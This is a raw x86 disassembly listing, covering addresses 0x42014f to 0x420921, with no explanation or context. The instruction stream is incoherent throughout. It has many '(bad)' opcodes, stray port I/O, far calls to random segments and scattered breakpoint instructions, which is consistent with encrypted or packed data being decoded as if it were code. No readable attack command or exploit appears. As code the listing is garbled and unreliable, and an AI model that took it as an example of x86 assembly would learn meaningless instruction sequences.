  42014f:	and    BYTE PTR [ebp+0xd9c150d],cl
  420155:	adc    DWORD PTR [edx],ebp
  420157:	ins    BYTE PTR es:[edi],dx
  420158:	push   ecx
  420159:	fdiv   DWORD PTR [edx]
  42015b:	xchg   BYTE PTR [ebp-0x309df902],cl
  420161:	retf   
  420162:	sub    eax,0x48ccad8c
  420167:	out    0x9b,al
  420169:	mov    eax,0xf90eed7b
  42016e:	add    al,0x5c
  420170:	adc    eax,0x366bd26b
  420175:	mov    dh,0xd8
  420177:	lea    esp,[ebx]
  420179:	jo     0x420197
  42017b:	fwait
  42017c:	jg     0x420105
  42017e:	gs inc esp
  420180:	out    dx,eax
  420181:	inc    edi
  420182:	data16 jae 0x4201e4
  420185:	aad    0xb3
  420187:	repz adc eax,DWORD PTR [edx+0xa5e703d]
  42018e:	pop    esp
  42018f:	jecxz  0x4201d8
  420191:	sbb    DWORD PTR [ebp-0x69411c3],esi
  420197:	xchg   edx,eax
  420198:	xchg   edx,eax
  420199:	aad    0x7a
  42019b:	div    BYTE PTR [ebx]
  42019d:	loop   0x420145
  42019f:	jg     0x420142
  4201a1:	sub    edx,DWORD PTR [edi]
  4201a3:	jo     0x4201e7
  4201a5:	dec    edi
  4201a6:	(bad)  
  4201a7:	or     esp,DWORD PTR ds:0xa13b551b
  4201ad:	ss jmp 0x42019e
  4201b0:	sub    ebx,DWORD PTR [edx]
  4201b2:	sub    ebx,DWORD PTR [eax-0x4a]
  4201b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201b6:	jns    0x4201a4
  4201b8:	cmp    ecx,edx
  4201ba:	pop    ecx
  4201bb:	gs jecxz 0x4201fc
  4201be:	je     0x4201e2
  4201c0:	test   BYTE PTR cs:[edx],al
  4201c3:	ret    0xd441
  4201c6:	in     eax,dx
  4201c7:	inc    eax
  4201c8:	mov    ch,0x3a
  4201ca:	lods   eax,DWORD PTR ds:[esi]
  4201cb:	push   eax
  4201cc:	inc    edi
  4201cd:	push   cs
  4201ce:	inc    ebp
  4201cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201d0:	jl     0x42024d
  4201d2:	mov    eax,ds:0x344d8991
  4201d7:	in     eax,dx
  4201d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201d9:	icebp  
  4201da:	out    dx,al
  4201db:	test   al,0xd8
  4201dd:	call   0xac62:0xcb94c7eb
  4201e4:	int3   
  4201e5:	loopne 0x420183
  4201e7:	mov    edi,0x4491f910
  4201ec:	scas   al,BYTE PTR es:[edi]
  4201ed:	jns    0x420227
  4201ef:	je     0x4201dd
  4201f1:	mov    ch,0x8d
  4201f3:	and    al,0x26
  4201f5:	pop    ebx
  4201f6:	(bad)
  4201fa:	cwde   
  4201fb:	mov    al,0x56
  4201fd:	es push esp
  4201ff:	ficom  DWORD PTR [ebx]
  420201:	cmp    BYTE PTR ds:0xbcc1b55,bh
  420207:	inc    ecx
  420208:	xchg   cl,dh
  42020a:	outs   dx,DWORD PTR ds:[esi]
  42020b:	dec    ebx
  42020c:	js     0x420232
  42020e:	pop    esi
  42020f:	or     al,0x5a
  420211:	inc    edi
  420212:	int3   
  420213:	or     eax,0xe03d7dcf
  420218:	inc    eax
  420219:	mov    esi,0xd2b600d2
  42021e:	pusha  
  42021f:	popa   
  420220:	mov    BYTE PTR [eax+0x1e],cl
  420223:	mov    ds:0xd044397c,eax
  420228:	test   al,0x2c
  42022a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42022c:	pop    edx
  42022d:	xchg   BYTE PTR [esi],dh
  42022f:	mov    eax,0x925f7b3
  420234:	pop    ebp
  420235:	stos   DWORD PTR es:[edi],eax
  420236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420237:	mov    eax,0xa339a764
  42023c:	push   ebx
  42023d:	add    DWORD PTR [ebp+0x0],edi
  420240:	out    0x77,eax
  420242:	inc    ebp
  420243:	pusha  
  420244:	lods   al,BYTE PTR ds:[esi]
  420245:	ds js  0x420278
  420248:	int3   
  420249:	retf   0xd3e0
  42024c:	xor    BYTE PTR [ebp+0x3c],ch
  42024f:	das    
  420250:	sbb    DWORD PTR [ebx+0x7d437b12],edi
  420256:	mov    al,0x45
  420258:	ja     0x420254
  42025a:	out    dx,al
  42025b:	mov    al,ds:0x7cd8d47d
  420260:	mov    gs,WORD PTR [edi]
  420262:	out    dx,al
  420263:	push   ebp
  420264:	lods   al,BYTE PTR ds:[esi]
  420265:	out    0xa1,al
  420267:	xchg   esi,eax
  420268:	jp     0x4202d9
  42026a:	test   al,0x55
  42026c:	xchg   edx,eax
  42026d:	dec    ebx
  42026e:	aas    
  42026f:	loope  0x4202d3
  420271:	adc    eax,DWORD PTR [edx]
  420273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420274:	mov    ch,0x71
  420276:	cdq    
  420277:	mov    BYTE PTR [ebx-0x39],al
  42027a:	test   BYTE PTR [edi],ah
  42027c:	dec    edx
  42027d:	push   ss
  42027e:	stc    
  42027f:	arpl   WORD PTR [ecx+0x3649e7df],dx
  420285:	jmp    0xc736:0xf5d5567b
  42028c:	mov    esi,0x783ec165
  420291:	jecxz  0x4202c7
  420293:	push   esi
  420294:	call   0x7b55b98d
  420299:	xchg   edi,eax
  42029a:	xchg   ebp,eax
  42029b:	lahf   
  42029c:	ror    BYTE PTR [esp+ebx*2],1
  42029f:	adc    cl,bh
  4202a1:	push   esp
  4202a2:	pop    edi
  4202a3:	fisub  DWORD PTR [edx+0x399b1c90]
  4202a9:	pusha  
  4202aa:	sub    eax,0xd5932d86
  4202af:	lock dec dl
  4202b2:	pop    eax
  4202b3:	stc    
  4202b4:	push   ss
  4202b5:	add    dl,BYTE PTR [edi+ecx*8-0x67]
  4202b9:	cli    
  4202ba:	lods   al,BYTE PTR ds:[esi]
  4202bb:	mov    dh,0x76
  4202bd:	xor    ah,cl
  4202bf:	and    eax,0x856cd16b
  4202c4:	mov    ch,0xc8
  4202c6:	jno    0x420314
  4202c8:	pop    ecx
  4202c9:	jecxz  0x4202e0
  4202cb:	jbe    0x420278
  4202cd:	push   ecx
  4202ce:	jg     0x420259
  4202d0:	sub    eax,DWORD PTR [ebx]
  4202d2:	cwde   
  4202d3:	retf   
  4202d4:	mov    ch,BYTE PTR [ecx]
  4202d6:	adc    al,0x7a
  4202d8:	push   esp
  4202d9:	adc    al,0xa8
  4202db:	mov    edi,0xf2619517
  4202e0:	scas   eax,DWORD PTR es:[edi]
  4202e1:	inc    esi
  4202e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202e3:	dec    edi
  4202e4:	mov    ss,esp
  4202e6:	or     al,BYTE PTR [ecx-0x50]
  4202e9:	inc    edx
  4202ea:	pop    esp
  4202eb:	mov    ecx,0x132fb647
  4202f0:	out    dx,eax
  4202f1:	and    dh,BYTE PTR [esi-0x4276816d]
  4202f7:	mov    BYTE PTR [edi+0x15],ah
  4202fa:	inc    edx
  4202fb:	adc    eax,DWORD PTR [ecx]
  4202fd:	stos   DWORD PTR es:[edi],eax
  4202fe:	(bad)  
  420300:	int3   
  420301:	retf   0x2950
  420304:	les    esi,FWORD PTR [ebx-0x788de912]
  42030a:	ss sub eax,0xa379881c
  420310:	mov    cl,0xa8
  420312:	test   al,0xa6
  420314:	icebp  
  420315:	ins    BYTE PTR es:[edi],dx
  420316:	icebp  
  420317:	pop    es
  420318:	push   eax
  420319:	(bad)  
  42031a:	mov    ebx,0x4ee8b1ed
  42031f:	adc    ebx,DWORD PTR [ebp+0x5f]
  420322:	jbe    0x420358
  420324:	jle    0x420319
  420326:	sbb    eax,edx
  420328:	into   
  420329:	je     0x420389
  42032b:	mov    es,WORD PTR [eax]
  42032d:	daa    
  42032e:	push   esi
  42032f:	dec    ebp
  420330:	xor    eax,DWORD PTR [ebx-0x40]
  420333:	mov    cl,0x53
  420335:	rol    ecx,0x1b
  420338:	hlt    
  420339:	nop
  42033a:	jecxz  0x4202d7
  42033c:	jmp    0x420323
  42033e:	mov    ds:0x6ea598f9,eax
  420343:	xor    DWORD PTR [ebx-0x5],esi
  420346:	mov    dl,0x97
  420348:	shr    DWORD PTR [ecx],cl
  42034a:	sub    ebx,DWORD PTR [eax]
  42034c:	mov    edi,DWORD PTR [edx]
  42034e:	imul   edi,edx,0xf
  420351:	stos   DWORD PTR es:[edi],eax
  420352:	out    dx,eax
  420353:	scas   al,BYTE PTR es:[edi]
  420354:	sahf   
  420355:	pop    ss
  420356:	fisub  WORD PTR [ebp-0x5f]
  420359:	or     eax,0x557c8b36
  42035e:	(bad)  
  42035f:	pop    edi
  420360:	mov    esi,0x256f3d03
  420365:	jno    0x42033b
  420367:	(bad)  
  420368:	ja     0x4203df
  42036a:	aas    
  42036b:	mov    WORD PTR [edx+eiz*4+0x2],ss
  42036f:	mov    ecx,0x6a9694e4
  420374:	(bad)  
  420375:	dec    edi
  420376:	ret    
  420377:	int3   
  420378:	(bad)  
  420379:	(bad)  [esi-0x5ab00d4d]
  42037f:	mov    dl,0x74
  420381:	popa   
  420382:	xor    esi,DWORD PTR [ebx-0x59]
  420385:	and    cl,BYTE PTR [esi]
  420387:	xchg   edi,eax
  420388:	xchg   DWORD PTR ss:[ebx+0x4738eb54],ebp
  42038f:	es push ss
  420391:	test   eax,ecx
  420393:	lahf   
  420394:	sub    eax,0xc81f7c0b
  420399:	mov    bl,0x79
  42039b:	leave  
  42039c:	push   cs
  42039d:	adc    BYTE PTR ds:0x6640904a,bl
  4203a3:	in     eax,0x86
  4203a5:	or     esp,0xffffffe6
  4203a8:	hlt    
  4203a9:	sub    al,0x58
  4203ab:	mov    ch,0x74
  4203ad:	inc    eax
  4203ae:	mov    dl,BYTE PTR [esi-0x4aeed52e]
  4203b4:	addr16 mov al,ds:0xb9a6
  4203b8:	push   cs
  4203b9:	lods   al,BYTE PTR ds:[esi]
  4203ba:	push   edi
  4203bb:	ins    BYTE PTR es:[edi],dx
  4203bc:	lahf   
  4203bd:	cdq    
  4203be:	jge    0x4203aa
  4203c0:	ss push ebp
  4203c2:	pop    ecx
  4203c3:	or     BYTE PTR [esi],dh
  4203c5:	fdiv   QWORD PTR [ebx-0x6b]
  4203c8:	jae    0x42036b
  4203ca:	fcomp  DWORD PTR [edx]
  4203cc:	dec    ebp
  4203cd:	mov    WORD PTR [ebx+0x7d],?
  4203d0:	cs dec esi
  4203d2:	aad    0xc2
  4203d4:	lods   al,BYTE PTR ds:[esi]
  4203d5:	test   BYTE PTR [ebx],dl
  4203d7:	add    BYTE PTR [edi+edx*1-0x50],0x59
  4203dc:	xchg   esi,eax
  4203dd:	xor    BYTE PTR [eax-0x43],0x80
  4203e1:	inc    eax
  4203e2:	fisub  DWORD PTR [ebp-0x65ea1c50]
  4203e8:	enter  0xef60,0xdd
  4203ec:	enter  0x5e87,0xac
  4203f0:	push   ebx
  4203f1:	mov    esi,0xc6f4616c
  4203f6:	jb     0x4203f9
  4203f8:	xor    dh,BYTE PTR [ebx]
  4203fa:	es or  al,0x50
  4203fd:	loop   0x420418
  4203ff:	and    DWORD PTR [esi],ebx
  420401:	rcr    DWORD PTR [edi-0x29],1
  420404:	sub    edi,DWORD PTR [ebp-0x3cb80c2d]
  42040a:	add    al,0xca
  42040c:	out    dx,eax
  42040d:	adc    eax,0xc5ae654f
  420412:	mov    DWORD PTR [ecx-0x63],ebp
  420415:	and    edx,DWORD PTR [edi]
  420417:	stc    
  420418:	mov    ch,0xff
  42041a:	ret    0x5fe4
  42041d:	(bad)  
  42041e:	xor    bh,BYTE PTR [ebp*8+0x70dfeac6]
  420425:	xor    al,0x6d
  420427:	mov    ebp,0x374f7aae
  42042c:	imul   edi,DWORD PTR [ecx],0x49eb8abb
  420432:	and    eax,0x7727f4a6
  420437:	stc    
  420438:	cmc    
  420439:	gs retf 0x4c41
  42043d:	or     eax,0x37976e2f
  420442:	ror    ebx,cl
  420444:	hlt    
  420445:	pop    ebx
  420446:	push   edx
  420447:	cmp    esi,esp
  420449:	out    dx,eax
  42044a:	inc    esi
  42044b:	add    BYTE PTR [ecx-0x568cc7ca],bh
  420451:	mov    bh,0xfe
  420453:	pop    DWORD PTR [eax]
  420455:	mov    ds:0xe3f58540,eax
  42045a:	test   DWORD PTR [esi],edi
  42045c:	mov    eax,0x3aadd980
  420461:	pop    eax
  420462:	mov    eax,ds:0xc8514d6b
  420467:	xor    bl,BYTE PTR ss:[esi+esi*1+0x4a]
  42046c:	into   
  42046d:	push   eax
  42046e:	push   es
  42046f:	mov    esi,0xcfbebdca
  420474:	mov    esi,0x8e0f047f
  420479:	lahf   
  42047a:	push   edi
  42047b:	push   esp
  42047c:	cld    
  42047d:	pop    eax
  42047e:	cmp    eax,DWORD PTR [eax*4-0x7e335339]
  420485:	test   al,0x34
  420487:	bound  esp,QWORD PTR [edi+0x5]
  42048a:	addr16 cmp ah,0xac
  42048e:	clc    
  42048f:	cli    
  420490:	mov    ds:0xd0ee7d3e,al
  420495:	repnz repz mov dl,BYTE PTR [ebp-0x3f502003]
  42049d:	ret    0xcde9
  4204a0:	popf   
  4204a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a2:	sub    esi,ecx
  4204a4:	mov    edx,0xd0b870d8
  4204a9:	and    DWORD PTR [ebx-0x3529d40e],edi
  4204af:	and    esp,DWORD PTR [ecx]
  4204b1:	das    
  4204b2:	push   esi
  4204b3:	push   edi
  4204b4:	(bad)  
  4204b5:	jo     0x420484
  4204b7:	rcl    DWORD PTR [edx+0x7e],1
  4204ba:	daa    
  4204bb:	and    edi,DWORD PTR [edi-0x63972da7]
  4204c1:	retf   0x63b7
  4204c4:	out    dx,eax
  4204c5:	cmp    al,0x31
  4204c8:	jmp    0xbcc2d623
  4204cd:	aas    
  4204ce:	and    bh,BYTE PTR [ecx-0x3c]
  4204d1:	and    eax,0x6466b2f4
  4204d6:	push   0x31
  4204d8:	dec    edi
  4204d9:	inc    edx
  4204da:	ds (bad) 
  4204dc:	push   eax
  4204dd:	xor    DWORD PTR [edi-0x4804db2c],esp
  4204e3:	out    dx,al
  4204e4:	outs   dx,BYTE PTR ds:[esi]
  4204e5:	lahf   
  4204e6:	adc    DWORD PTR [edx],0xb
  4204e9:	test   esi,edi
  4204eb:	mov    edi,esp
  4204ed:	je     0x42052b
  4204ef:	jno    0x420556
  4204f1:	and    BYTE PTR [ecx-0x50b91711],al
  4204f7:	clc    
  4204f8:	and    al,BYTE PTR [ebx-0x61]
  4204fb:	add    BYTE PTR [edi-0x2],dl
  4204fe:	mov    edx,0x6041b500
  420503:	or     DWORD PTR [eax+0x70d14d72],ebx
  420509:	jnp    0x420552
  42050b:	push   0xffffffdf
  42050d:	push   edx
  42050e:	addr16 cli 
  420510:	jo     0x4204f8
  420512:	(bad)  
  420513:	ds mov edx,0x5df5c011
  420519:	clc    
  42051a:	(bad)  
  42051b:	and    esp,DWORD PTR [ebx]
  42051d:	aas    
  42051e:	dec    eax
  42051f:	test   DWORD PTR [edi+0x2e],ecx
  420522:	stos   BYTE PTR es:[edi],al
  420523:	mov    bh,0x65
  420525:	movups XMMWORD PTR [esp+ebp*4+0x49473e95],xmm3
  42052d:	jge    0x42051f
  42052f:	add    al,0x89
  420531:	sub    esp,DWORD PTR [edx]
  420533:	(bad)  
  420534:	inc    ebp
  420535:	dec    edi
  420536:	dec    edx
  420537:	push   edx
  420538:	mul    ebp
  42053a:	fadd   DWORD PTR [ebx]
  42053c:	scas   al,BYTE PTR es:[edi]
  42053d:	adc    ah,0x76
  420540:	loope  0x420596
  420542:	xchg   ebx,eax
  420543:	adc    ch,BYTE PTR [edi]
  420545:	imul   ebp,DWORD PTR [ebp+0x4d],0x20
  420549:	and    BYTE PTR [edi+0x1d],bl
  42054c:	sbb    DWORD PTR [ebx-0x50],eax
  42054f:	scas   eax,DWORD PTR es:[edi]
  420550:	inc    esi
  420551:	mov    esp,0xb4fb2a4c
  420556:	cmp    DWORD PTR [ebx-0x789ad70d],0x46
  42055d:	pop    eax
  42055e:	sbb    edi,DWORD PTR ds:0xd23d0125
  420564:	add    al,0x8b
  420566:	out    0xf9,al
  420568:	sahf   
  420569:	xor    bl,ah
  42056b:	in     eax,dx
  42056c:	cwde   
  42056d:	(bad)
  420571:	sbb    eax,0x9492a38a
  420576:	clc    
  420577:	jo     0x420513
  420579:	adc    eax,0x14d8c6a9
  42057e:	sti    
  42057f:	mov    ebp,0x3d982818
  420584:	js     0x4205e6
  420586:	std    
  420587:	mov    DWORD PTR [esi-0x59321bac],0xc1357e3
  420591:	xor    ecx,eax
  420593:	in     al,dx
  420594:	xor    dh,BYTE PTR [eax-0x61d7988b]
  42059a:	sbb    BYTE PTR [edx-0x5d],cl
  42059d:	pusha  
  42059e:	js     0x4205e5
  4205a0:	sbb    eax,0xab60ce0f
  4205a5:	cli    
  4205a6:	lds    cx,DWORD PTR [eax]
  4205a9:	pop    edi
  4205aa:	xor    al,0x9a
  4205ac:	inc    ecx
  4205ad:	je     0x4205c3
  4205af:	lods   eax,DWORD PTR ds:[esi]
  4205b0:	pop    eax
  4205b1:	das    
  4205b2:	mov    ebx,0x1cd9d0ee
  4205b7:	outs   dx,BYTE PTR ds:[esi]
  4205b8:	xchg   bl,cl
  4205ba:	push   edx
  4205bb:	and    al,0xac
  4205bd:	inc    eax
  4205bf:	aaa    
  4205c0:	xchg   DWORD PTR [ecx],ebx
  4205c2:	inc    eax
  4205c3:	cmp    al,0xdc
  4205c5:	int    0x12
  4205c7:	js     0x420634
  4205c9:	pop    esp
  4205ca:	jbe    0x4205a3
  4205cc:	popa   
  4205cd:	repz dec ebx
  4205cf:	retf   0x30ca
  4205d2:	xor    eax,0xf9fa6561
  4205d7:	shl    BYTE PTR [ebp-0x41fa8500],0x81
  4205de:	push   esp
  4205df:	xchg   BYTE PTR [edi+esi*4-0x80],bh
  4205e3:	mov    ch,0x92
  4205e5:	adc    DWORD PTR [eax-0x6f],0x16
  4205e9:	scas   eax,DWORD PTR es:[edi]
  4205ea:	shl    BYTE PTR [ecx],cl
  4205ec:	pushf  
  4205ed:	push   ebx
  4205ee:	adc    ebx,DWORD PTR [ecx+0x3a]
  4205f1:	mov    edx,0x700bc387
  4205f6:	ret    
  4205f7:	je     0x4205d9
  4205f9:	call   0x4ef56f84
  4205fe:	xchg   esp,eax
  4205ff:	adc    esp,esi
  420601:	push   cs
  420602:	sbb    ebp,eax
  420604:	cmp    esp,DWORD PTR [eax+0x7a]
  420607:	sub    al,dl
  420609:	cmp    DWORD PTR [ecx],esp
  42060b:	fistp  QWORD PTR [ebx-0x67]
  42060e:	dec    ecx
  42060f:	adc    BYTE PTR [esi-0x17],ch
  420612:	mov    bh,0x34
  420614:	aam    0xfe
  420616:	fsubr  DWORD PTR [eax+0x72]
  420619:	dec    edi
  42061a:	loopne 0x420685
  42061c:	neg    BYTE PTR [eiz*8+0x48adac81]
  420623:	mov    DWORD PTR [ecx],ebp
  420625:	push   edx
  420626:	ins    DWORD PTR es:[edi],dx
  420627:	jmp    0x10f9473
  42062c:	call   0xaaba:0x88febb57
  420633:	ret    0x18ee
  420636:	mov    bh,0x35
  420638:	push   eax
  420639:	jl     0x42068c
  42063b:	xchg   ebp,eax
  42063c:	push   esp
  42063d:	fsubr  st,st(0)
  42063f:	sbb    DWORD PTR [ecx-0x4a],edi
  420642:	leave  
  420643:	clc    
  420644:	add    esi,DWORD PTR [edx-0x25]
  420647:	sub    BYTE PTR [eax+0x35f5b8c1],dl
  42064d:	adc    BYTE PTR [eax],dh
  42064f:	scas   eax,DWORD PTR es:[edi]
  420650:	shl    dh,1
  420652:	jle    0x420650
  420654:	int    0x74
  420656:	xor    ecx,DWORD PTR [ebp+edi*4-0x7674548f]
  42065d:	pop    ecx
  42065e:	mov    edx,0x991d119c
  420663:	fwait
  420664:	inc    ebx
  420665:	sbb    al,0x9f
  420667:	in     al,0x7d
  420669:	mov    esi,0x67065e8b
  42066e:	lahf   
  42066f:	push   ss
  420670:	call   0x4176:0x815bb80
  420677:	aam    0xa4
  420679:	adc    esi,DWORD PTR [ebp+0x4888d68f]
  42067f:	lea    ebx,[ecx]
  420681:	push   0x4a9c7f66
  420686:	lods   al,BYTE PTR ds:[esi]
  420687:	push   esi
  420688:	dec    edi
  420689:	ss dec edi
  42068b:	and    BYTE PTR [eax-0x203559e7],0xbf
  420692:	ins    BYTE PTR es:[edi],dx
  420693:	sbb    BYTE PTR [ecx],bl
  420695:	leave  
  420696:	cld    
  420697:	ffreep st(5)
  420699:	fmul   DWORD PTR [esi]
  42069b:	fidivr WORD PTR ds:0x9064fd63
  4206a1:	and    dh,BYTE PTR [ecx-0x270940a6]
  4206a7:	or     esi,edx
  4206a9:	mov    esi,0x90320b0a
  4206ae:	bound  ecx,QWORD PTR [edx-0x60cb65c3]
  4206b4:	mov    ecx,0x18e3c43d
  4206b9:	fidiv  DWORD PTR [ecx+eiz*2-0x4e099250]
  4206c0:	fldenv [eax-0x27d65248]
  4206c6:	mov    ebx,0x924732d9
  4206cb:	and    eax,0xec9dcdd8
  4206d0:	adc    eax,0xb4773116
  4206d5:	or     ebp,DWORD PTR [esi-0x11]
  4206d8:	ins    DWORD PTR es:[edi],dx
  4206d9:	add    eax,eax
  4206db:	xchg   DWORD PTR [eax],ecx
  4206dd:	adc    eax,DWORD PTR [ebx+0x0]
  4206e0:	loope  0x42071a
  4206e2:	cmp    BYTE PTR [eax-0x8],bl
  4206e5:	out    dx,al
  4206e6:	fnstenv [edx-0x1d]
  4206e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ea:	jne    0x4206fe
  4206ec:	push   es
  4206ed:	lds    ebp,FWORD PTR [ebp+0xe]
  4206f0:	inc    edi
  4206f1:	arpl   WORD PTR [eax+esi*8-0x4dba195c],ax
  4206f8:	lea    ecx,[ebp+ebp*1+0x12]
  4206fc:	aaa    
  4206fd:	mov    eax,ds:0xa65f5a87
  420702:	jns    0x4206dd
  420704:	scas   eax,DWORD PTR es:[edi]
  420705:	sub    dh,bl
  420707:	xchg   ebx,eax
  420708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420709:	stos   BYTE PTR es:[edi],al
  42070a:	mov    esp,0x95bb81ec
  42070f:	fucomi st,st(5)
  420711:	mov    edi,0xf8710d0e
  420716:	ins    DWORD PTR es:[edi],dx
  420717:	(bad)  
  420718:	mov    esi,0xfae22fec
  42071d:	push   ebp
  42071e:	or     eax,0x114d60b
  420723:	or     esp,0x169ebb5c
  420729:	pop    ecx
  42072a:	push   esi
  42072b:	shl    ebx,0x63
  42072e:	lods   eax,DWORD PTR ds:[esi]
  42072f:	xchg   edi,eax
  420730:	xor    dl,BYTE PTR [ebx-0x55]
  420733:	mov    dh,0xeb
  420735:	push   edx
  420736:	(bad)
  42073a:	mov    eax,0x3a13f8a1
  42073f:	xor    ch,dl
  420741:	ja     0x4206dc
  420743:	sahf   
  420744:	jmp    0x420757
  420746:	sbb    BYTE PTR [edi-0x54cc179f],ah
  42074c:	bound  ebp,QWORD PTR [ebx]
  42074e:	push   edi
  42074f:	js     0x4207cb
  420751:	imul   DWORD PTR ds:0x298ba400
  420757:	cmp    eax,0xaffe0963
  42075c:	push   edi
  42075d:	inc    edi
  42075e:	mov    ds:0xdfdcb445,al
  420763:	pop    esi
  420764:	test   al,0xcb
  420766:	and    bh,BYTE PTR [ecx+0x1eb0fc76]
  42076c:	mov    cl,0x5e
  42076e:	inc    esp
  42076f:	hlt    
  420770:	cmp    BYTE PTR [esp+ecx*2+0x10],cl
  420774:	(bad)  
  420775:	dec    esi
  420776:	mov    eax,ds:0xb78c2c1d
  42077b:	pop    edx
  42077d:	repnz aam 0xbb
  420780:	or     bh,bh
  420782:	int    0xdd
  420784:	mov    edx,0xc8846d0f
  420789:	das    
  42078a:	mov    eax,gs
  42078c:	xchg   DWORD PTR [eax],esp
  42078e:	xlat   BYTE PTR ds:[ebx]
  42078f:	nop
  420790:	dec    ebx
  420791:	mov    ds:0xfac83d70,al
  420796:	out    0x53,eax
  420798:	icebp  
  420799:	add    DWORD PTR [edi-0x90e372],ebx
  42079f:	pop    eax
  4207a0:	jl     0x42074e
  4207a2:	cmc    
  4207a3:	dec    esi
  4207a4:	aas    
  4207a5:	sti    
  4207a6:	jecxz  0x4207de
  4207a8:	sub    eax,0x1bb2d29d
  4207ad:	push   ebx
  4207ae:	or     BYTE PTR [ebp+0x3c4bbad5],0xba
  4207b5:	sbb    eax,0x434207ea
  4207ba:	repz test eax,0x4a4fca9c
  4207c0:	sbb    DWORD PTR [eax-0xf309219],0xffffffbf
  4207c7:	aas    
  4207c8:	int3   
  4207c9:	adc    BYTE PTR fs:0x8bec8701,bl
  4207d0:	call   0x67fa418c
  4207d5:	fs jmp 0xd78da840
  4207db:	data16 or BYTE PTR [esp+edi*8-0x38],al
  4207e0:	ror    bh,0xfc
  4207e3:	xlat   BYTE PTR ds:[ebx]
  4207e4:	xor    edi,DWORD PTR [ebx-0x7c12eba5]
  4207ea:	jg     0x420773
  4207ec:	push   eax
  4207ed:	pusha  
  4207ee:	push   ebx
  4207ef:	sbb    al,bh
  4207f1:	cmp    al,0xb6
  4207f3:	mov    ecx,0xd48ccf2e
  4207f8:	clc    
  4207f9:	mov    al,ds:0x434a3fe3
  4207fe:	loop   0x420845
  420800:	cmp    dl,0x1c
  420803:	ror    DWORD PTR [esi],cl
  420805:	mov    eax,0x11e69b82
  42080a:	in     eax,dx
  42080b:	aaa    
  42080c:	int    0xa2
  42080e:	scas   eax,DWORD PTR es:[edi]
  42080f:	mov    edx,0xa40b9dd0
  420814:	repz (bad) 
  420816:	push   ecx
  420817:	or     eax,0x2a48680c
  42081c:	jge    0x420869
  42081e:	fiadd  WORD PTR [ecx-0x1e4c3318]
  420824:	add    al,0x87
  420826:	cmp    dh,dh
  420828:	xchg   edx,eax
  420829:	xor    dl,al
  42082b:	(bad)  
  42082c:	stc    
  42082d:	loopne 0x42088c
  42082f:	mov    edx,ebp
  420831:	test   eax,0x38c84979
  420836:	arpl   WORD PTR [edi-0x74],dx
  420839:	mov    dl,0xd2
  42083b:	add    ch,bl
  42083d:	test   BYTE PTR [eax+0x488305f3],ah
  420843:	sub    eax,0xf32e0c32
  420848:	retf   
  420849:	jmp    0x420872
  42084b:	jle    0x420834
  42084d:	add    al,BYTE PTR [ebp+0x3b46290]
  420853:	sbb    ah,bh
  420855:	inc    edi
  420856:	ret    
  420857:	lock mov edx,0xcac274fb
  42085d:	ret    
  42085e:	fistp  WORD PTR [esi]
  420860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420861:	mov    ebp,esi
  420863:	adc    al,BYTE PTR [ebx]
  420865:	sbb    BYTE PTR [edx],cl
  420867:	hlt    
  420868:	mov    bl,0x40
  42086a:	stos   BYTE PTR es:[edi],al
  42086b:	scas   al,BYTE PTR es:[edi]
  42086c:	adc    ebp,0xd966bc6a
  420872:	dec    esi
  420873:	(bad)  
  420874:	pop    ds
  420875:	sbb    eax,0xe0484bc7
  42087a:	push   ecx
  42087b:	adc    al,0x92
  42087d:	push   ecx
  42087e:	jg     0x420881
  420880:	fisub  WORD PTR [eax-0x54]
  420883:	arpl   sp,bx
  420885:	mov    ebx,0x4836b31e
  42088a:	mov    ah,0x1a
  42088c:	rcl    BYTE PTR [ecx+0x3f],cl
  42088f:	sub    cl,BYTE PTR [edx+edx*1+0x19]
  420893:	or     bl,BYTE PTR [edx-0x61]
  420896:	or     eax,0xda401904
  42089b:	cmp    edi,ebx
  42089d:	jb     0x4208b8
  42089f:	loop   0x4208c4
  4208a1:	inc    ebx
  4208a2:	pop    ebp
  4208a3:	mov    BYTE PTR [esp+edi*8+0x3cf0b940],dl
  4208aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208ab:	adc    edi,DWORD PTR [esi]
  4208ad:	mov    ebp,0x4175cf03
  4208b2:	sbb    DWORD PTR [eax+0x9],0x16
  4208b6:	cmp    eax,0xcd8c61b5
  4208bb:	test   eax,0xe1f341b8
  4208c0:	cs stos BYTE PTR es:[edi],al
  4208c2:	repz pop ecx
  4208c4:	shl    BYTE PTR [esi+0x6d],cl
  4208c7:	push   0xffffff89
  4208c9:	ins    BYTE PTR es:[edi],dx
  4208ca:	push   esi
  4208cb:	pop    es
  4208cc:	js     0x4208c9
  4208ce:	mov    edx,0x9a43ef9a
  4208d3:	loopne 0x420887
  4208d5:	mov    bh,0x25
  4208d7:	inc    ecx
  4208d8:	push   ebx
  4208d9:	mov    edx,0x696d0d2b
  4208de:	loope  0x4208d7
  4208e0:	call   0x6671:0x68d10efb
  4208e7:	mov    ebp,ds
  4208e9:	loopne 0x420888
  4208eb:	int    0xd0
  4208ed:	scas   eax,DWORD PTR es:[edi]
  4208ee:	mov    eax,0x2e655958
  4208f3:	inc    edi
  4208f4:	dec    esi
  4208f5:	out    0x6d,eax
  4208f7:	pop    ebp
  4208f8:	outs   dx,BYTE PTR ds:[esi]
  4208f9:	sbb    DWORD PTR [ebp-0x62630717],0x68
  420900:	xchg   esi,eax
  420901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420902:	aam    0x8f
  420904:	loopne 0x420962
  420906:	(bad)  
  420907:	push   cs
  420908:	fsub   DWORD PTR [ebx+0x70]
  42090b:	stos   BYTE PTR es:[edi],al
  42090c:	inc    esp
  42090d:	xchg   ecx,eax
  42090e:	fimul  WORD PTR [ebx-0x67]
  420911:	mov    eax,0x69159a3b
  420916:	ret    0x3c25
  420919:	lea    esp,[ebp+0xde427f6]
  42091f:	sbb    al,0x62
  420921:	jmp    0xb1cf65e9
